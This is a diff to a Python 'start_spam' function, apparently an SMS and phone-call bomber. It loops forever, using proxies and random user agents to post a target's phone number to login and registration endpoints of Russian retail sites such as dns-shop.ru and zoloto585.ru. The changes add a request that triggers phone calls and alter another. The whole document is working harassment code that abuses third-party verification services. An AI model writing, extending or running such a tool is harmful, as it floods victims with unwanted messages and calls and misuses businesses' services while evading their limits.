@@ -89,6 +89,12 @@ def start_spam(phone, proxies):
     headers = {"User-Agent": generate_user_agent()}
     while True:
         try:
+            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": "1"}, headers=headers, proxies=proxies)
+            print(f"{BRIGHT}{GREEN} success dns 2")
+        except:
+            pass
+            print(f"{BRIGHT}{RED} fail")
+        try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
             post("https://zoloto585.ru/api/bcard/reg/", json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": formatted_phone, "email": "", "city": ""}, headers=headers, proxies=proxies)
             print(f"{BRIGHT}{GREEN} success")
@@ -937,9 +943,8 @@ def start_spam(phone, proxies):
             pass
             print(f"{BRIGHT}{RED} fail")
         try:
-            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
-            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": formatted_phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": 1}, headers=headers, proxies=proxies)
-            print(f"{BRIGHT}{GREEN} success")
+            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": "0"}, headers=headers, proxies=proxies)
+            print(f"{BRIGHT}{GREEN} success dns")
         except:
             pass
             print(f"{BRIGHT}{RED} fail")
